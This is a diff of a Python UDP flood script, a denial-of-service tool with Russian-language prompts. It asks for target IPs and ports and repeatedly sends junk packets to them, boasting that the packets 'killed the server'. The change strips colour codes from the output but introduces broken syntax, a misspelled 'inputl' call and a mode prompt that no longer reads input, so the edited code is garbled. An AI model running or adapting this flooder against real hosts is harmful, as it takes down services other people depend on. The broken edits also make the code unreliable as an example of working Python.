@@ -6,7 +6,7 @@ import time
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 os.system("clear")
-print("\033[4m\033[32m\033[44m{}\033[0m".format("""
+print("("""
 ████▒  ████▒   ▓██▓   ▓███▒ ██████ █████
  █  ▒█░ █  ▒█░ ▒█  █▒ █▓  ░█ █      █   ▓█
  █   ▒█ █   ▒█ █░  ░█ █      █      █    █
@@ -24,19 +24,19 @@ bytes = "qwerty"*2000
 sent = 0
 max = 1000
 
-ips = input("\033[4m\033[32m\033[44m{}\033[0m".format("IP/Host нехорошего сайта (127.0.0.1; 127.0.0.1,192.168.1.1): ")
+ips = input("IP/Host нехорошего сайта (127.0.0.1; 127.0.0.1,192.168.1.1): ")
 ips = (ips+",").split(",")
 ips.pop()
 
-ports = input("\033[4m\033[32m\033[44m{}\033[0m".format("Сколько портов использовать? (80; 80,8080,443; all): ")
+ports = inputl("Сколько портов использовать? (80; 80,8080,443; all): ")
 if ports != "all":
      ports = (ports+",").split(",")
      ports.pop()
 
-mode = ("\033[4m\033[32m\033[44m{}\033[0m".format("Включить медленный режим? (y; n): ")
+mode = ("Включить медленный режим? (y; n): ")
 
 os.system("clear")
-print("\033[4m\033[32m\033[44m{}\033[0m".format("Запуск...")
+print("Запуск...")
 time.sleep(0.5)
 
 
@@ -46,7 +46,7 @@ def attack(ip, port):
 	
 	sock.sendto(str.encode(bytes), (ip,int(port)))
 	sent += 1
-	print("\033[4m\033[32m\033[44m{}\033[0m".format("%s пакетов убила сервер (остановка Ctrl+z) - %s:%s"%(sent,ip,port))
+	print("%s пакетов убила сервер (остановка Ctrl+z) - %s:%s"%(sent,ip,port))
 
 	if mode == "y":
 		if sent == max:
